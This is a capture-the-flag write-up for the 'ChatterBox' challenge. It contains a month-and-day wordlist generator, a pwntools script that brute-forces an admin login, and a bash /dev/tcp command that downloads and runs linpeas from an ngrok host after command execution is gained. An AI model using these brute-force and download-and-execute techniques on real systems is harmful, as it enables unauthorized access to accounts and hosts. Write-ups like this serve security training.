#### ChatterBox
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6bb8ee28-f7ad-4803-a864-700b9a1e31a2)

This challenge isn't really binary exploitation in my opinion just more of like scripting

Anyways we are given this:

```
If you ever need to talk, just reach out to any of our employees.

As a side note, we think you should know we like talking in months and days. Hopefully you understand.
```

Connecting to the remote instance shows this prompt
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/29c4cb02-fc71-4e12-9472-98f7bd319d04)

So we are to find a way to access this

I assumed that the username will be `admin` but now for the password how do we go about it?

Well I can always try brute force using a wordlist like rockyou but it might take a while

So back to what the description says :

```
As a side note, we think you should know we like talking in months and days. Hopefully you understand.
```

This is a hint that's based on using months and days

I then make a script to create a wordlist and brute force the password

Here's the script I used to create the [wordlist](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/csean/pwn/chatterbox/wordlist.py)

```
#!/usr/bin/python3

# Hint to how the password should be: As a side note, we think you should know we like talking in months and days. 

# Months
months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
months_upper = [j.upper() for j in months]
months2_lower = [i.lower() for i in months]

# Date
dates = [str(date) for date in range(32)]

# Form the wordlist
wordlist = []

for month in months:
    for date in dates:
        wordlist.append(month + date)

for month in months_upper:
    for date in dates:
        wordlist.append(month + date)

for month in months2_lower:
    for date in dates:
        wordlist.append(month + date)


# Save wordlist
with open('wordlist.txt', 'w') as fd:
    for i in wordlist:
        fd.write(i+'\n')
```

And I used this to [brute force](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/csean/pwn/chatterbox/brute.py)

```python
#!/usr/bin/python3
from pwn import *
import sys
from multiprocessing import Pool as pool
from warnings import filterwarnings

# Set context
context.log_level = 'info'
filterwarnings('ignore')

# Define a function for the brute force >3
def brute_password(password):
    io = remote('0.cloud.chals.io', 33091)
    io.recv(1024) 
    io.sendline(b"admin")
    io.recv(1024)
    io.sendline(password)
    result = io.recv(1024)
    print(result)
    if b"Invalid credentials" not in result:
        print(f'Password: {password}')
        
        
# Read password from the wordlist 
with open('wordlist.txt', 'r') as fd:
    wordlist = fd.readlines()

if __name__ == '__main__':
    start = pool(int('5'))
    start.map(brute_password, wordlist)

# Credential: admin:july10
```

I can now connect to the remote instance
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a553da93-05dc-47b8-ad86-2398837cf7fe)

The Check Operational Status looked interesting

I choose the option and was able to run os commands
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d06426bf-1337-4cb2-ac1c-e64e57bb897b)

At this point I got a reverse shell and uploaded linpeas to the box

But the issue was no binary was available and of cause this is excepted cause we are in a docker container

Using bash I was able to upload linpeas

```
Host: python3 -m http.server 80

Target:-
exec 3<>/dev/tcp/6.tcp.eu.ngrok.io/10577
echo -e "GET /linpeas.sh HTTP/1.1\n\n">&3
cat <&3 > linpeas.sh
```

And when I ran it

```
chmod +x linpeas.sh
bash linpeas.sh
```

I saw the flag in the environment variable
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2270207c-1618-4dd7-bbf2-d6d3f547ffc9)

```
Flag: csean-ctf{SOMETIMES_I_WONDER_HOW_th!s_3v3n_PASSED_BeT4_TEST!}
```
